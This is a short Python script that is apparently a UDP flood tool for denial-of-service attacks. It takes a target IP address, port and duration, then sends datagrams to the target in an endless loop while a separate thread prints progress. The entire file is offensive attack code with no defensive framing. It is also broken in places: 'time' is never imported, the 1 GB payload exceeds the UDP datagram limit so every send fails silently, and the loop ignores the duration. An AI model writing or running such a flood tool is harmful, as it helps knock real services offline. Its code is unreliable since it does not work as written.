import threading
import socket
import sys

def UDPFlood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)  # Set maximum send buffer size

    data_size = 1 * 1024 * 1024 * 1024  # 1 GB
    data = b"A" * data_size

    while True:
        try:
            sock.sendto(data, (ip, port))
            bytes_sent = len(data)
        except:
            bytes_sent = 0

        print(f"Sent {bytes_sent} bytes to {ip}:{port}")

def Timer(duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(1)
        print("Sending data...")

if __name__ == "__main__":
    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])

    sender_thread = threading.Thread(target=UDPFlood, args=(ip, port))
    timer_thread = threading.Thread(target=Timer, args=(duration,))

    sender_thread.start()
    timer_thread.start()

    sender_thread.join()
    timer_thread.join()
